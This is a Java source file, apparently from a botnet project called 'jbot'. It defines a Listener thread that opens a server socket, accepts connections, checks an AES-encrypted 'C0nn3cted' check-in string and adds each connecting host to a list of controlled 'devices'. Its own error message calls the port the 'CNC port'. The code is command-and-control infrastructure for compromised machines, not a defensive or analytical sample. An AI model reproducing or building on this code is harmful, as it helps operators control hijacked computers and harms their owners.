package me.aaronakhtar.jbot.threads;

import me.aaronakhtar.jbot.JBot;
import me.aaronakhtar.jbot.Options;
import me.aaronakhtar.jbot.crypto.Aes;
import me.aaronakhtar.jbot.objects.Device;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

public class Listener extends Thread { // listens for new device connections

    /*
    Connection packets will probably be formatted this way:
    "C0nn3cted" encrypted (AES)
     */

    @Override
    public void run() {
        try {
            final ServerSocket serverSocket = new ServerSocket(Options.listener_port);
            while(true){
                Socket socket = serverSocket.accept();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String line = bufferedReader.readLine();
                if (line != null){
                    if (Aes.decrypt(line, Options.secret_key).equals("C0nn3cted")){
                        // Valid Device Connection
                        if (!JBot.allowMultipleInstances){
                            boolean f = false;
                            for (Device d : JBot.devices){
                                if (d.getInetAddress().getHostAddress().equals(socket.getInetAddress().getHostAddress())){
                                    f = true;
                                }
                            }

                            if (!f){
                                JBot.devices.add(new Device(socket.getInetAddress()));
                            }

                        }else{
                            JBot.devices.add(new Device(socket.getInetAddress()));
                        }
                    }
                }
                bufferedReader.close();
                socket.close();
            }
        }catch (Exception e){
            if (JBot.isUnderDev){
                e.printStackTrace();
            }
            System.out.println("Error starting Listener, this may be due to the server already having CNC port inuse, restart the server if this is a mistake.");
            System.exit(0);
        }
    }
}
